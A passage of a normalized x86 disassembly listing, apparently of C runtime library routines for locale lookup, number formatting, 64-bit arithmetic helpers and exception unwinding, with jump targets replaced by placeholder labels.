push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_100203c5
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_100203c5
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_100203c5
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_100203c5
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_1007cd63
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10079b60
inc eax
push eax
push esi
add esi edi
push esi
call sub_10078db0
add esp 0x10
sub_1007cd82
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_1006a508
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_1004fd6f
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_1004fd6f
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_1007cd63
pop esi
mov [ eax ] esi
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_10078db0
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_1007cee3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_1006a508
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_10079b60
inc eax
push eax
push esi
push ebx
call sub_10078db0
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_10079b60
inc eax
push eax
push esi
push ebx
call sub_10078db0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_1007cd63
push edi
push 0x30
push ebx
call sub_10079a10
add esp 0xc
sub_1007cfe6
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push ebx
push esi
push edi
mov edi [ GetLocaleInfoW@IAT ]
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call edi
mov ecx eax
mov [ ebp - 0xc ] ecx
cmp ecx esi
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn
push [ ebp - 0xc ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_1003b313
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_1004ac7a
pop ecx
cmp eax esi
je r-xdata
call sub_1007d0c0
mov ebx esp
cmp ebx esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov ebx eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ ebx ] 0xcccc
add ebx 0x8
jmp r-xdata
push 0xffffffff
push ebx
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp ebx esi
je r-xdata
sub_1007d0f0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1007d136
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
jns r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_1007d198
mov edi edi
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x20001004
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push r--data
push esi
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
leave
retn
call [ GetACP@IAT ]
leave
retn
push r--data
push esi
call sub_10079ce0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_1000eda6
pop ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x2000000b
push [ edi + 0x1c ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
sub_1007d21c
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
add eax 0x2
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1007d241
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
lea eax [ ecx - 0x61 ]
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
lea eax [ ecx - 0x41 ]
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
add esi esi
lea esi [ eax + esi * 8 - 0x30 ]
add cl 0xf9
sub_1007d272
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_1007d28d
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10039c8c
mov edx edi
mov esi eax
call sub_1007d241
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0xb0 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0xa0 ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0xa4 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0xa4 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_1007d21c
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn 0x4
or [ esi + 0xa4 ] 0x4
mov [ esi + 0xb8 ] edi
mov [ esi + 0xb4 ] edi
sub_1007d334
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
mov eax esi
and eax 0x3ff
push 0x20000001
or eax 0x400
push eax
call [ GetLocaleInfoW@IAT ]
test eax eax
jne r-xdata
cmp esi [ ebp - 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ ebp + 0xc ]
mov esi [ eax ]
push edi
mov edx esi
call sub_1007d272
push esi
mov edi eax
call sub_10079b60
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_1007d38f
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10039c8c
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1007d241
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100239df
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100206e1
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10079b60
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_1007d21c
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10079b60
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push esi
push ebx
mov [ esi + 0x18 ] edi
push esi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
mov eax edi
call sub_1007d334
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1007d560
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_10039c8c
mov edx edi
lea esi [ eax + 0x9c ]
call sub_1007d241
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10024145
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push esi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_100239df
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax edi
call sub_1007d334
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
push eax
sub_1007d620
push [ esi ]
call sub_10079b60
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10079b60
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1007d272
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_1007d38f
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_1007d687
push [ esi ]
call sub_10079b60
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1007d272
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_1007d560
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_1007d6d0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1007d710
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_1007d770
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007d790
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10024145
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1007d7d5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1007d7d5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1007d790
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1007d885
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1007d8a4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1007d87c
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1007d885
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1007d8a7
push 0x14
push r--data
call sub_10079bf0
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007d978
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_10079c35
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_1001fc0f
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_1007d949
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_1005ca43
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_1005ca43
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_1007d990
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_1007d9c0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1007daa0
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1007dabf
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1004fd6f
push 0x16
pop esi
pop ebx
pop ebp
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1004fd6f
push 0x22
jmp r-xdata
pop edi
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
call sub_1001d849
mov eax esi
jmp r-xdata
mov edi ecx
xor ebx ebx
inc ebx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
